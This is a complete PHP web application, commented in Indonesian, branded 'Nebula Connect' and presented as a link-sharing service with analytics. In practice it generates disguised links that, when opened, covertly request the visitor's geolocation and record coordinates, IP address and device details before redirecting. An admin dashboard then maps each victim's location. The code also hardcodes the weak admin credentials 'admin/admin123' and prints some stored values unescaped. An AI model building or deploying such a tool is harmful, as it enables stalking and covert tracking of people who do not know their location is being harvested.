<?php
// Inisialisasi sesi untuk login admin
session_start();

// Direktori untuk menyimpan file JSON
$data_dir = 'data';
if (!file_exists($data_dir)) {
    mkdir($data_dir, 0755, true);
}

$links_file = $data_dir . '/links.json';
$tracking_file = $data_dir . '/tracking.json';

// Inisialisasi file jika belum ada
if (!file_exists($links_file)) {
    file_put_contents($links_file, json_encode([]));
}
if (!file_exists($tracking_file)) {
    file_put_contents($tracking_file, json_encode([]));
}

// Fungsi untuk membuat ID unik
function generateUniqueID() {
    return substr(md5(uniqid(mt_rand(), true)), 0, 10);
}

// Handler untuk pembuatan link baru
if (isset($_POST['create_link'])) {
    $original_link = trim($_POST['original_link']);
    
    if (!empty($original_link)) {
        $links = json_decode(file_get_contents($links_file), true);
        
        $link_id = generateUniqueID();
        $tracking_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https://" : "http://") . 
                        $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . "/index.php?id=" . $link_id;
        
        $links[$link_id] = [
            'original_link' => $original_link,
            'created_at' => date('Y-m-d H:i:s'),
            'tracking_link' => $tracking_link,
            'status' => 'Belum dibuka'
        ];
        
        file_put_contents($links_file, json_encode($links, JSON_PRETTY_PRINT));
        
        $success_message = "Link berhasil dibuat!";
        $new_link = $tracking_link;
    }
}

// Handler untuk halaman tracking
if (isset($_GET['id'])) {
    $link_id = $_GET['id'];
    $links = json_decode(file_get_contents($links_file), true);
    
    if (isset($links[$link_id])) {
        $original_link = $links[$link_id]['original_link'];
        $links[$link_id]['status'] = 'Sudah dibuka';
        file_put_contents($links_file, json_encode($links, JSON_PRETTY_PRINT));
        
        // Siapkan halaman untuk menyimpan data lokasi
        $tracking_page = true;
    } else {
        header('Location: index.php');
        exit;
    }
}

// Handler untuk menyimpan data tracking
if (isset($_POST['save_tracking'])) {
    $data = $_POST;
    $tracking_data = json_decode(file_get_contents($tracking_file), true);
    
    if (!isset($tracking_data[$data['link_id']])) {
        $tracking_data[$data['link_id']] = [];
    }
    
    $tracking_entry = [
        'latitude' => $data['latitude'],
        'longitude' => $data['longitude'],
        'timestamp' => date('Y-m-d H:i:s'),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
        'ip_address' => $_SERVER['REMOTE_ADDR']
    ];
    
    array_push($tracking_data[$data['link_id']], $tracking_entry);
    file_put_contents($tracking_file, json_encode($tracking_data, JSON_PRETTY_PRINT));
    
    header('Content-Type: application/json');
    echo json_encode(['success' => true]);
    exit;
}

// Login admin
$admin_username = 'admin';
$admin_password = 'admin123'; // Ganti dengan password yang lebih kuat di implementasi nyata

if (isset($_POST['admin_login'])) {
    if ($_POST['username'] === $admin_username && $_POST['password'] === $admin_password) {
        $_SESSION['admin_logged_in'] = true;
    } else {
        $login_error = "Username atau password salah!";
    }
}

// Logout admin
if (isset($_GET['logout'])) {
    unset($_SESSION['admin_logged_in']);
    header('Location: index.php');
    exit;
}

// Cek apakah admin sudah login
$admin_logged_in = isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true;

// Jika halaman admin diminta
$show_admin = isset($_GET['admin']) && $_GET['admin'] === 'dashboard';

?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nebula Connect</title>
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <?php if (isset($tracking_page) || ($show_admin && $admin_logged_in)): ?>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <?php endif; ?>
    <style>
        :root {
            --primary-color: #00f7ff;
            --secondary-color: #8a2be2;
            --bg-dark: #0a0a1a;
            --bg-darker: #050510;
            --text-color: #e0e0ff;
            --card-bg: rgba(20, 20, 40, 0.7);
            --accent: #ff3e78;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: var(--bg-dark);
            color: var(--text-color);
            font-family: 'Rajdhani', sans-serif;
            line-height: 1.6;
            position: relative;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        body::before, body::after {
            content: '';
            position: fixed;
            width: 300px;
            height: 300px;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.2;
            z-index: -1;
        }
        
        body::before {
            background: var(--primary-color);
            top: -100px;
            left: -100px;
        }
        
        body::after {
            background: var(--secondary-color);
            bottom: -100px;
            right: -100px;
        }
        
        .container {
            width: 90%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 0;
        }
        
        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 5%;
            background: rgba(10, 10, 30, 0.7);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .logo {
            display: flex;
            align-items: center;
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--primary-color);
            text-decoration: none;
        }
        
        .logo i {
            margin-right: 10px;
        }
        
        .nav-links a {
            color: var(--text-color);
            text-decoration: none;
            margin-left: 25px;
            position: relative;
            font-weight: 500;
            transition: all 0.3s ease;
        }
        
        .nav-links a:hover {
            color: var(--primary-color);
        }
        
        .nav-links a::after {
            content: '';
            position: absolute;
            width: 0;
            height: 2px;
            bottom: -5px;
            left: 0;
            background: var(--primary-color);
            transition: width 0.3s ease;
        }
        
        .nav-links a:hover::after {
            width: 100%;
        }
        
        .hero {
            text-align: center;
            padding: 80px 0;
        }
        
        .hero h1 {
            font-size: 3rem;
            margin-bottom: 20px;
            background: linear-gradient(90deg, var(--primary-color), var(--accent));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            position: relative;
            display: inline-block;
        }
        
        .hero p {
            font-size: 1.2rem;
            max-width: 600px;
            margin: 0 auto 40px;
            opacity: 0.8;
        }
        
        .card {
            background: var(--card-bg);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            backdrop-filter: blur(10px);
            animation: cardFadeIn 0.8s ease-out;
        }
        
        @keyframes cardFadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            font-size: 1.1rem;
        }
        
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: var(--text-color);
            font-family: 'Rajdhani', sans-serif;
            font-size: 1rem;
            transition: all 0.3s ease;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 2px rgba(0, 247, 255, 0.3);
        }
        
        button {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: var(--bg-darker);
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-family: 'Rajdhani', sans-serif;
            font-weight: 600;
            font-size: 1rem;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
        }
        
        button::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to right, transparent 0%, rgba(255, 255, 255, 0.1) 50%, transparent 100%);
            transform: translateX(-100%);
            transition: transform 0.6s ease;
        }
        
        button:hover::before {
            transform: translateX(100%);
        }
        
        .result-link {
            margin-top: 30px;
            padding: 20px;
            background: rgba(0, 247, 255, 0.1);
            border-radius: 8px;
            position: relative;
            overflow: hidden;
        }
        
        .result-link p {
            margin-bottom: 15px;
            font-weight: 500;
        }
        
        .link-display {
            background: rgba(0, 0, 0, 0.2);
            padding: 12px;
            border-radius: 6px;
            word-break: break-all;
            margin-bottom: 15px;
            border: 1px dashed rgba(255, 255, 255, 0.1);
        }
        
        .copy-btn {
            background: var(--accent);
            font-size: 0.9rem;
            padding: 8px 15px;
        }
        
        .admin-panel {
            display: grid;
            grid-template-columns: 1fr;
            gap: 30px;
        }
        
        @media (min-width: 992px) {
            .admin-panel {
                grid-template-columns: 1fr 2fr;
            }
        }
        
        .admin-sidebar {
            background: var(--card-bg);
            border-radius: 15px;
            padding: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .admin-sidebar h3 {
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .admin-sidebar ul {
            list-style: none;
        }
        
        .admin-sidebar li {
            margin-bottom: 10px;
        }
        
        .admin-sidebar a {
            display: flex;
            align-items: center;
            padding: 10px;
            color: var(--text-color);
            text-decoration: none;
            border-radius: 6px;
            transition: all 0.3s ease;
        }
        
        .admin-sidebar a:hover {
            background: rgba(255, 255, 255, 0.05);
        }
        
        .admin-sidebar a i {
            margin-right: 10px;
            color: var(--primary-color);
        }
        
        .admin-content {
            background: var(--card-bg);
            border-radius: 15px;
            padding: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .admin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 15px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .admin-header h2 {
            color: var(--primary-color);
        }
        
        .link-list {
            margin-top: 20px;
        }
        
        .link-item {
            padding: 15px;
            margin-bottom: 15px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 8px;
            border-left: 3px solid var(--primary-color);
        }
        
        .link-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .link-title {
            font-weight: 600;
            font-size: 1.1rem;
        }
        
        .status {
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
        }
        
        .status-pending {
            background: rgba(255, 193, 7, 0.2);
            color: #ffc107;
        }
        
        .status-opened {
            background: rgba(40, 167, 69, 0.2);
            color: #28a745;
        }
        
        .link-details {
            margin-top: 10px;
            font-size: 0.9rem;
            opacity: 0.8;
        }
        
        .map-container {
            height: 300px;
            margin-top: 15px;
            border-radius: 8px;
            overflow: hidden;
        }
        
        .tracking-info {
            margin-top: 15px;
            background: rgba(0, 0, 0, 0.2);
            padding: 10px;
            border-radius: 6px;
        }
        
        .tracking-info p {
            margin-bottom: 5px;
            font-size: 0.9rem;
        }
        
        .alert {
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 8px;
            animation: fadeIn 0.5s ease-out;
        }
        
        .alert-success {
            background: rgba(40, 167, 69, 0.2);
            border: 1px solid rgba(40, 167, 69, 0.3);
            color: #28a745;
        }
        
        .alert-error {
            background: rgba(220, 53, 69, 0.2);
            border: 1px solid rgba(220, 53, 69, 0.3);
            color: #dc3545;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .footer {
            text-align: center;
            padding: 30px 0;
            margin-top: 50px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
            font-size: 0.9rem;
            opacity: 0.7;
        }
        
        /* Animasi kursor di halaman tracking */
        .pulse {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            background: var(--accent);
            position: absolute;
            animation: pulse 1s infinite;
        }
        
        @keyframes pulse {
            0% {
                transform: scale(0.8);
                opacity: 0.8;
            }
            50% {
                transform: scale(1.2);
                opacity: 0.5;
            }
            100% {
                transform: scale(0.8);
                opacity: 0.8;
            }
        }
        
        /* Gaya untuk halaman loading */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: var(--bg-darker);
            z-index: 9999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        
        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            border-top-color: var(--primary-color);
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        
        .loading-text {
            margin-top: 20px;
            font-size: 1.2rem;
            letter-spacing: 1px;
        }
        
        /* Responsive adjustments */
        @media (max-width: 768px) {
            .hero h1 {
                font-size: 2.2rem;
            }
            
            .hero p {
                font-size: 1rem;
            }
            
            .card {
                padding: 20px;
            }
            
            nav {
                padding: 15px 5%;
            }
            
            .logo {
                font-size: 1.3rem;
            }
            
            .nav-links a {
                margin-left: 15px;
                font-size: 0.9rem;
            }
        }
        
        @media (max-width: 576px) {
            .container {
                width: 95%;
            }
            
            .hero {
                padding: 50px 0;
            }
            
            .hero h1 {
                font-size: 1.8rem;
            }
            
            .admin-header {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .admin-header h2 {
                margin-bottom: 10px;
            }
        }
    </style>
</head>
<body>
    <nav>
        <a href="index.php" class="logo"><i class="fas fa-globe-asia"></i> Nebula Connect</a>
        <div class="nav-links">
            <a href="index.php">Home</a>
            <?php if (!$admin_logged_in): ?>
                <a href="index.php?admin=login">Admin</a>
            <?php else: ?>
                <a href="index.php?admin=dashboard">Dashboard</a>
                <a href="index.php?logout=true">Logout</a>
            <?php endif; ?>
        </div>
    </nav>

    <?php if (isset($tracking_page)): ?>
    <!-- Halaman Redirect dengan Pelacakan -->
    <div class="loading-overlay">
        <div class="loader"></div>
        <div class="loading-text">Connecting to your content...</div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Minta izin lokasi dan kirim ke server
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    
                    // Kirim data ke server
                    fetch('index.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                        },
                        body: 'save_tracking=1&link_id=<?php echo $link_id; ?>&latitude=' + latitude + '&longitude=' + longitude
                    })
                    .then(response => response.json())
                    .then(data => {
                        // Redirect setelah data tersimpan
                        setTimeout(function() {
                            window.location.href = "<?php echo htmlspecialchars($original_link); ?>";
                        }, 2000);
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        // Redirect anyway after a timeout
                        setTimeout(function() {
                            window.location.href = "<?php echo htmlspecialchars($original_link); ?>";
                        }, 2000);
                    });
                }, function(error) {
                    console.error('Error getting location:', error);
                    // Redirect anyway if user denies location access
                    setTimeout(function() {
                        window.location.href = "<?php echo htmlspecialchars($original_link); ?>";
                    }, 2000);
                });
            } else {
                // Redirect jika geolocation tidak didukung
                setTimeout(function() {
                    window.location.href = "<?php echo htmlspecialchars($original_link); ?>";
                }, 2000);
            }
        });
    </script>
    <?php elseif (isset($_GET['admin']) && $_GET['admin'] === 'login' && !$admin_logged_in): ?>
    <!-- Halaman Login Admin -->
    <div class="container">
        <div class="hero">
            <h1>Admin Login</h1>
            <p>Access your dashboard to monitor connections</p>
        </div>
        
        <div class="card">
            <?php if (isset($login_error)): ?>
            <div class="alert alert-error">
                <?php echo $login_error; ?>
            </div>
            <?php endif; ?>
            
            <form method="post" action="index.php?admin=login">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                
                <button type="submit" name="admin_login">Login</button>
            </form>
        </div>
    </div>
    <?php elseif ($show_admin && $admin_logged_in): ?>
    <!-- Dashboard Admin -->
    <div class="container">
        <div class="admin-panel">
            <div class="admin-sidebar">
                <h3>Admin Panel</h3>
                <ul>
                    <li><a href="#"><i class="fas fa-link"></i> Link Tracking</a></li>
                    <li><a href="index.php"><i class="fas fa-plus"></i> Create New Link</a></li>
                    <li><a href="index.php?logout=true"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
                </ul>
            </div>
            
            <div class="admin-content">
                <div class="admin-header">
                    <h2>Link Tracking Dashboard</h2>
                </div>
                
                <div class="link-list">
                    <?php
                    $links = json_decode(file_get_contents($links_file), true);
                    $tracking_data = json_decode(file_get_contents($tracking_file), true);
                    
                    if (empty($links)) {
                        echo "<p>No links have been created yet.</p>";
                    } else {
                        foreach ($links as $id => $link_data) {
                            $status_class = $link_data['status'] == 'Belum dibuka' ? 'status-pending' : 'status-opened';
                            ?>
                            <div class="link-item">
                                <div class="link-header">
                                    <div class="link-title"><?php echo htmlspecialchars(substr($link_data['original_link'], 0, 50) . (strlen($link_data['original_link']) > 50 ? '...' : '')); ?></div>
                                    <span class="status <?php echo $status_class; ?>"><?php echo $link_data['status']; ?></span>
                                </div>
                                
                                <div class="link-details">
                                    <p><strong>Tracking Link:</strong> <?php echo htmlspecialchars($link_data['tracking_link']); ?></p>
                                    <p><strong>Created:</strong> <?php echo $link_data['created_at']; ?></p>
                                </div>
                                
                                <?php if ($link_data['status'] == 'Sudah dibuka' && isset($tracking_data[$id])): ?>
                                    <?php foreach ($tracking_data[$id] as $index => $track): ?>
                                        <div class="tracking-info">
                                            <p><strong>Access Time:</strong> <?php echo $track['timestamp']; ?></p>
                                            <p><strong>Location:</strong> Lat: <?php echo $track['latitude']; ?>, Long: <?php echo $track['longitude']; ?></p>
                                            <p><strong>Device:</strong> <?php echo htmlspecialchars($track['user_agent']); ?></p>
                                            <p><strong>IP Address:</strong> <?php echo $track['ip_address']; ?></p>
                                        </div>
                                        
                                        <div id="map-<?php echo $id . '-' . $index; ?>" class="map-container"></div>
                                        
                                        <script>
                                            document.addEventListener('DOMContentLoaded', function() {
                                                const map = L.map('map-<?php echo $id . '-' . $index; ?>').setView([<?php echo $track['latitude']; ?>, <?php echo $track['longitude']; ?>], 13);
                                                
                                                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                                                    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                                                }).addTo(map);
                                                
                                                L.marker([<?php echo $track['latitude']; ?>, <?php echo $track['longitude']; ?>])
                                                    .addTo(map)
                                                    .bindPopup('User location at <?php echo $track['timestamp']; ?>')
                                                    .openPopup();
                                            });
                                        </script>
                                    <?php endforeach; ?>
                                <?php endif; ?>
                            </div>
                            <?php
                        }
                    }
                    ?>
                </div>
            </div>
        </div>
    </div>
    <?php else: ?>
    <!-- Halaman Utama -->
    <div class="container">
        <div class="hero">
            <h1>Nebula Connect</h1>
            <p>Share your content across platforms with enhanced analytics and advanced features.</p>
        </div>
        
        <div class="card">
            <?php if (isset($success_message)): ?>
            <div class="alert alert-success">
                <?php echo $success_message; ?>
            </div>
            <?php endif; ?>
            
            <form method="post" action="index.php">
                <div class="form-group">
                    <label for="original_link">Enter your link</label>
                    <input type="text" id="original_link" name="original_link" placeholder="https://tiktok.com/..." required>
                </div>
                
                <button type="submit" name="create_link">Generate Link <i class="fas fa-arrow-right"></i></button>
            </form>
            
            <?php if (isset($new_link)): ?>
            <div class="result-link">
                <p>Your custom link is ready:</p>
                <div class="link-display"><?php echo htmlspecialchars($new_link); ?></div>
                <button class="copy-btn" onclick="copyToClipboard('<?php echo $new_link; ?>')">
                    <i class="fas fa-copy"></i> Copy Link
                </button>
            </div>
            <?php endif; ?>
        </div>
        
        <div class="card">
            <h2>Why use Nebula Connect?</h2>
            <p>Nebula Connect provides elegant solutions for sharing content across different platforms, offering enhanced analytics and ensuring your audience has the best experience when accessing your shared links.</p>
        </div>
    </div>
    <?php endif; ?>
    
    <footer class="footer">
        <p>&copy; 2025 Nebula Connect | Next-Generation Link Solutions</p>
    </footer>
    
    <script>
        function copyToClipboard(text) {
            const tempInput = document.createElement('input');
            tempInput.value = text;
            document.body.appendChild(tempInput);
            tempInput.select();
            document.execCommand('copy');
            document.body.removeChild(tempInput);
            
            const copyBtn = document.querySelector('.copy-btn');
            const originalText = copyBtn.innerHTML;
            copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
            
            setTimeout(() => {
                copyBtn.innerHTML = originalText;
            }, 2000);
        }
    </script>
</body>
</html>
